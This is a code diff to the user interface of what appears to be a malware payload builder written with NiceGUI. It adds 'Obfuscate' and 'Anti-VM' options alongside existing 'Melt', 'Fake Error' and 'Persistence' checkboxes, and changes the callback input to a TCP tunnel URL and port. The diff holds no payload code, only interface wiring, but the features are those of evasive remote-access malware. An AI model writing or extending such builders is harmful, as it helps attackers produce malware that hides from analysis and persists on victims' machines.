@@ -1,6 +1,6 @@
-from ui.modules.builder.main import BuildPayload
+from panel.ui.modules.builder.main import BuildPayload
 
-from ui.media.images import Images
+from panel.ui.media.images import Images
 
 from nicegui import ui
 
@@ -34,20 +34,22 @@ def builder() -> None:
             "melt": "Melt",
             "fakeerror": "Fake Error",
             "persistence": "Persistence",
+            "obfuscate": "Obfuscate",
+            "anti_vm": "Anti-VM",
         }
 
         checkbox_values = {}
 
         with ui.splitter() as splitter:
             with splitter.before:
-                for key, label in list(checkbox_options.items())[:3]:
+                for key, label in list(checkbox_options.items())[:4]:
                     checkbox_values[key] = ui.checkbox(label)
             with splitter.after:
-                for key, label in list(checkbox_options.items())[3:]:
+                for key, label in list(checkbox_options.items())[4:]:
                     checkbox_values[key] = ui.checkbox(label)
 
         url = (
-            ui.input("HTTP tunnel URL")
+            ui.input("TCP TUNNEL URL:PORT", placeholder="https://example.com:12345")
             .on(
                 "keydown.enter",
                 lambda: build(
